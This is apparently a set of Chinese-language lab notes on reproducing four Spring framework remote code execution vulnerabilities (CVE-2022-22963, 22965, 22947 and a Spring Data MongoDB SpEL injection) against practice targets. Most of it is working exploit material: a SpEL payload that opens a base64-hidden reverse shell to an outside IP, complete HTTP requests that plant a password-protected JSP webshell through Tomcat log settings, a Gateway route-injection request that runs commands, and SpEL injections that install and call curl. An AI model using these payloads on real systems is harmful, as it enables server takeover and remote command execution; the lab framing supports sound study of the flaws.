## Spring框架漏洞



### 1.Spring Cloud Function SPEL 远程代码执行(CVE-2022-22963)

![image-20241015103043764](C:/Users/15539/AppData/Roaming/Typora/typora-user-images/image-20241015103043764.png)

这whitelabel error page就是经典的Spring 框架

访问/functionRouter底下如果有status 500的状态码说明可能存在漏洞

构造数据包(注意这里是POST请求)

![image-20241015103327977](https://s2.loli.net/2024/10/15/PUBVvAO9LxcDmaG.png)

```
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("bash -c {echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzExNi42Mi43LjIwNi82NjY2IDA+JjE=}|{base64,-d}|{bash,-i}")
```

其中的base64是要执行的语句

```
YmFzaCAtaSA+Ji9kZXYvdGNwLzExNi42Mi43LjIwNi82NjY2IDA+JjE=
转码后
bash -i >&/dev/tcp/116.62.7.206/6666 0>&1
```

建议在字典里加上/functionRouter的路径

另外现在很多工具好像都测不出来spring框架的漏洞

### 2. Spring Framework 远程命令执行漏洞(CVE-2022-22965)

> 参考:
>
> [【Vulfocus漏洞复现】spring-core-rce-2022-03-29-CSDN博客](https://blog.csdn.net/weixin_45632448/article/details/124190382)
>
> [CVE-2022-22965 Spring远程代码执行漏洞复现 - wavesky - 博客园 (cnblogs.com)](https://www.cnblogs.com/wavesky/p/16294694.html)
>
> [Spring框架远程命令执行复现（CVE-2022-22965） - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/335663.html)
>
> [Spring-Core RCE反序列化漏洞原理与复现_spring反序列化漏洞-CSDN博客](https://blog.csdn.net/FisrtBqy/article/details/130680683)
>
> 

![image-20241015124423752](https://s2.loli.net/2024/10/15/HOj1KRbEmrkWGNl.png)

#### 方法一:get方式

需要依次发送5个请求

完整利用链：

```
?class.module.classLoader.resources.context.parent.pipeline.first.pattern=
构建文件的内容
 
?class.module.classLoader.resources.context.parent.pipeline.first.suffix=
修改tomcat日志文件后缀
 
?class.module.classLoader.resources.context.parent.pipeline.first.directory=
写入文件所在的网站根目录
 
?class.module.classLoader.resources.context.parent.pipeline.first.prefix=
写入文件名称
 
?class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
文件日期格式（实际构造为空值即可）
```

构造payload:

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern=spring
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

![image-20241015124700952](https://s2.loli.net/2024/10/15/k8p7NoVwvrbUgmZ.png)

访问http://123.58.236.76:27379/shell.jsp，出现spring说明写入成功

![image-20241015124812476](https://s2.loli.net/2024/10/15/px2vR3AWCaUkfcB.png)

接下来需要做的就是将内容更改为webshell，并让它解析就可以了
写入webshell到网站根目录

```
url编码前的webshell：
%{c2}i if("t".equals(request.getParameter("pwd"))){ java.io.InputStream in = %{c1}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i

url编码后的webshell：
%25%7Bc2%7Di%20if(%22t%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di

```

要注意这加上这几个参数

![image-20241015125012982](https://s2.loli.net/2024/10/15/gcf3jnIrElews6x.png)

最终数据包

```
GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22t%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di HTTP/1.1
Host: 123.58.224.8:60448
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,zh-CN;q=0.6
Cookie: JSESSIONID=2F3A1B5679A89C654B842787A16F09CA
suffix:%>//
c1:Runtime
c2:<%
Connection: close


```

访问http://123.58.236.76:27379/shell.jsp?pwd=t&cmd=ls /tmp，出现flag

![image-20241015125127220](https://s2.loli.net/2024/10/15/WkbZKwn7teIHg6D.png)

#### 方法二：POST方式

```
POST / HTTP/1.1
Host: 192.168.255.128:5468
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
DNT: 1
suffix: %>
prefix: <%Runtime
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 496

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di.getRuntime%28%29.exec%28request.getParameter%28%22pass%22%29%29%3B%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/root&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

然后直接访问shell

![image-20241015131702519](https://s2.loli.net/2024/10/15/xGtF9YyPHjC7J4w.png)

> [Spring Core RCE 复现 - Erichas - 博客园 (cnblogs.com)](https://www.cnblogs.com/byErichas/p/16082155.html)
>
> [Spring框架远程命令执行复现（CVE-2022-22965） - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/335663.html)

#### 方法三：exp

[GitHub - wjl110/CVE-2022-22965_Spring_Core_RCE: CVE-2022-22965\Spring-Core-RCE堪比关于 Apache Log4j2核弹级别漏洞exp的rce一键利用](https://github.com/wjl110/CVE-2022-22965_Spring_Core_RCE)

### 3.Spring Cloud Gateway RCE(CVE-2022-22947)

我猜测有带#的可能是spring框架

actuator是一个后台监控系统

一般扫出/actuator/gateway/routes就可能存在此漏洞

其中还有env和headdump文件较为重要

![image-20241019003846781](https://s2.loli.net/2024/10/19/oQd9GFgef6TzAPq.png)

构造恶意的路由请求,直接发送数据包

```
POST /actuator/gateway/routes/test HTTP/1.1
Host: 123.58.224.8:27159
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 		Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 310

{
  "id": "hacktest",
 "filters": [{
"name": "AddResponseHeader",
"args": {
  "name": "Result",
  "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
}
  }],
  "uri": "http://example.com"
}

```

其中的id可以换成其他的命令

![image-20241019010215246](https://s2.loli.net/2024/10/19/ytXLmfuDMFTarPU.png)

然后应用刚添加的路由(刷新一下)，发送如下数据包

```
POST /actuator/gateway/refresh HTTP/1.1
Host: 123.58.224.8:27159
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like 		Gecko) Chrome/97.0.4692.71 Safari/537.36
Connection: close
Content-Type: application/json
Content-Length: 0


```

![image-20241019010250712](https://s2.loli.net/2024/10/19/1GVbsOXPZMTIJpH.png)

然后直接访问/actuator/gateway/routes就可以看到

![image-20241019010349535](https://s2.loli.net/2024/10/19/e7sbGZxARLOhDMH.png)

或者访问创建的/actuator/gateway/routes/test

### 4.Spring Data MongoDB SpEL Expression injection(CVE-2022-22890)

**影响范围:**

Spring Data MongoDB v3.4.0 及以下

**复现:**

payload:

```
http://127.0.0.1:8090/?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27apt-get install -y curl%27) 
```

如果环境里没有curl先apt安装curl

然后curl一下dnslog测试(也可以python -m http.server测试)

```
http://127.0.0.1:8090/?name=T(java.lang.String).forName(%27java.lang.Runtime%27).getRuntime().exec(%27crul wjyim8.dnslog.cn%27)
```

